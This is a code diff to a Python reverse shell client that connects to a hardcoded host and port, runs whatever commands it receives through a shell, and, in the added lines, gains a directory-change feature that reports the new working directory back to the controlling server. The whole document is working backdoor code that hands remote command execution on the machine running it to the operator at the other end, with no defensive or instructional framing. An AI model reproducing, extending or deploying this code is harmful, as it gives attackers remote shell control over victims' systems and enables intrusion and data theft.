@@ -2,6 +2,7 @@
 
 import socket
 import subprocess
+import os
 
 ip = "172.25.191.60"
 port = 8080
@@ -11,10 +12,26 @@ def connect():
     Mysocket.connect((ip, port))
 
     while True:
-        command = Mysocket.recv(1024)
+        command = Mysocket.recv(5000)
         if "terminate" in command.decode():
             Mysocket.close()
             break
+
+
+        # command format: "cd<space><Path name>"
+        # split using the space between 'cd' and path name
+        # ... (because, path name also may have spaces, that confuses the script)
+        #and explicitly tell the operating system to change the directory
+        elif 'cd' in command.decode():
+            try:
+                code, directory = command.decode().split(" ",1)
+                os.chdir(directory)
+                informToServer = "[+] Current working directory is " + str(os.getcwd())
+                Mysocket.send(informToServer.encode())
+            except Exception as e:
+                informToServer = "[+] Some error occured. " + str(e)
+                Mysocket.send(informToServer.encode())
+            
 
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
